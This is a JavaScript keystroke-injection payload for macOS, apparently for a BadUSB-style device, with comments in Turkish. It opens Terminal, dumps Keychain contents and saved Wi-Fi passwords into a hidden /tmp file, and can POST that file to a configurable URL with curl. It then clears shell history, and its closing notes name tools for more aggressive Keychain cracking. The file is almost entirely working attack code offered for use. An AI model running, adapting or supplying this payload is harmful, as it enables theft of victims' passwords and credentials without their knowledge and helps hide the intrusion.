// ═══════════════════════════════════════════════════════════════════════════
// Payload: mac_keychain.js
// Target:  macOS
// Time:    ~10 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: macOS Keychain'den credential çıkarma
// WiFi şifreleri, web şifreleri, sertifikalar
// NOT: Kullanıcı şifresi veya TouchID onayı gerekebilir
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION                                                            │
// └─────────────────────────────────────────────────────────────────────────┘
var EXFIL_URL = "";              // HTTP exfil (boş = sadece dosyaya kaydet)

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN TERMINAL                                                   │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-SPACE");
delay(500);
type("terminal");
delay(500);
press("ENTER");
delay(1500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: DUMP KEYCHAIN INFO (Non-sensitive - no password required)       │
// └─────────────────────────────────────────────────────────────────────────┘
// Keychain listesi
type("security list-keychains > /tmp/.keychain_dump.txt 2>&1");
press("ENTER");
delay(500);

// Tüm keychain entry'leri (şifreler hariç)
type("security dump-keychain >> /tmp/.keychain_dump.txt 2>&1");
press("ENTER");
delay(1000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: EXTRACT WIFI PASSWORDS                                          │
// └─────────────────────────────────────────────────────────────────────────┘
// WiFi şifreleri (her biri için şifre/TouchID gerekebilir)
type("echo '\\n=== WIFI NETWORKS ===' >> /tmp/.keychain_dump.txt");
press("ENTER");
delay(200);

// Bilinen WiFi ağlarını listele
type("networksetup -listpreferredwirelessnetworks en0 >> /tmp/.keychain_dump.txt 2>&1");
press("ENTER");
delay(500);

// WiFi şifresi çıkarma denemesi (popup çıkabilir)
type("echo '\\n=== ATTEMPTING WIFI PASSWORD EXTRACTION ===' >> /tmp/.keychain_dump.txt");
press("ENTER");
delay(200);

// Scriptli yaklaşım - her network için dene
type("for ssid in $(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | sed 's/^[[:space:]]*//'); do ");
type("echo \"$ssid: \"; security find-generic-password -D 'AirPort network password' -a \"$ssid\" -w 2>/dev/null || echo '[LOCKED]'; ");
type("done >> /tmp/.keychain_dump.txt 2>&1");
press("ENTER");
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 5: EXTRACT SAFARI PASSWORDS (Requires user interaction)            │
// └─────────────────────────────────────────────────────────────────────────┘
type("echo '\\n=== INTERNET PASSWORDS (Generic) ===' >> /tmp/.keychain_dump.txt");
press("ENTER");
delay(200);

// Internet password entry'lerini listele (şifreler gizli)
type("security find-internet-password -g 2>&1 | grep -E 'acct|srvr|class' >> /tmp/.keychain_dump.txt");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 6: SYSTEM INFO                                                     │
// └─────────────────────────────────────────────────────────────────────────┘
type("echo '\\n=== SYSTEM INFO ===' >> /tmp/.keychain_dump.txt");
press("ENTER");
type("echo \"Hostname: $(hostname)\" >> /tmp/.keychain_dump.txt");
press("ENTER");
type("echo \"User: $(whoami)\" >> /tmp/.keychain_dump.txt");
press("ENTER");
type("echo \"Date: $(date)\" >> /tmp/.keychain_dump.txt");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 7: EXFILTRATION                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
if (EXFIL_URL !== "") {
    type("curl -X POST -d @/tmp/.keychain_dump.txt " + EXFIL_URL + " 2>/dev/null");
    press("ENTER");
    delay(1000);
}

// Sonucu göster
type("echo 'Dump saved to /tmp/.keychain_dump.txt'");
press("ENTER");
delay(300);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 8: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
type("history -c && exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ NOTES                                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// Keychain erişimi genellikle:
// - Kullanıcı şifresi
// - TouchID
// - "Always Allow" seçilmiş olması gerekir
// 
// security komutu kullanımı:
// security find-generic-password -a "account" -s "service" -w
// security find-internet-password -s "server" -w
// 
// Daha agresif yöntemler için:
// - chainbreaker (offline keychain crack)
// - keychaindump (memory dump)

